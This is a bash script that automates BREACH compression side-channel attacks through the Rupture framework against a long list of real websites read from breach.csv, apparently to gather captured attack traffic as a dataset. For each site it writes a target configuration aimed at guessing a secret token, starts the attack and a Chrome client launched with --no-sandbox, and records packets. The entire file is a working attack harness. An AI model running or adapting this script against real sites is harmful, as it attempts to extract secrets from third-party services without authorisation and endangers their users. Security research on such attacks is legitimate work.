#!/bin/bash

# Parameters
BASEDIR=$(dirname -- "$(readlink -f -- "${BASH_SOURCE}")")
HTMLDIR="$HOME/.rupture/client/client_1"
TIMEOUT=60	# attack each website for 60 seconds 
COUNT=0
# initialize
ps -ef | grep rupture | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep chrome | grep -v grep | awk '{print $2}' | xargs kill -9	
rm -f backend/current_iplist.txt
rm -f backend/target_config.yml
# Main loop:
# every loop implement breach attack to a website and capture the traffic
# specify a timeout
for i in {1..7006}
do
# STEP 1: read next url from a csv file
	j=$[i+1]
	URL_IP=$(sed -n ${i}p breach.csv)
	URL=${URL_IP%,*}
	IP[COUNT]=${URL_IP#*,}
	URL_IP_NEXT=$(sed -n ${j}p breach.csv)
	URL_NEXT=${URL_IP_NEXT%,*}
	if [ $URL_NEXT = $URL ]
	then
		COUNT=$[COUNT+1]
		continue
	else
		IP_NUM=$COUNT
		COUNT=0
	fi
	echo 'STEP 1 finished'
	for i in ${IP[@]}
	do
		echo $i >> backend/current_iplist.txt
	done
# STEP 2: write the configuration to #/rupture/target_config.yml
	echo "web:
    endpoint: 'https://"$URL"?s=%s'
    prefix: 'token='
    alphabet: 'abcdefghijklmnopqrstuvwxyz'
    secretlength: 8
    alignmentalphabet: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    recordscardinality: 1
    method: 'serial'
    samplesize: 1
    confidence_threshold: 1.0" >> backend/target_config.yml
	echo 'STEP 2 finished'
# STEP 3: execute './rupture -s' to setup (how to choose id? change the source code to auto choose)
	$BASEDIR/rupture -s

	rm -f backend/target_config.yml
# STEP 4: launch sniffer to capture the comming traffic (only from client and the specific server)
	python capture.py $TIMEOUT $URL &
# STEP 5: execute './rupture --attack' to launch the attack
	./rupture --attack &

# STEP 6: execute 'test.html' in #/.rupture/client/client_* and launch the timer
	google-chrome --no-sandbox $HTMLDIR/test.html &

# STEP 7: when timeout, close browser and stop sniffer, save the traffic as a pcap file.
	sleep $TIMEOUT
# STEP 8: finish
	rm -f backend/current_iplist.txt
	ps -ef | grep rupture | grep -v grep | awk '{print $2}' | xargs kill -9
	ps -ef | grep chrome | grep -v grep | awk '{print $2}' | xargs kill -9
	sleep 1
done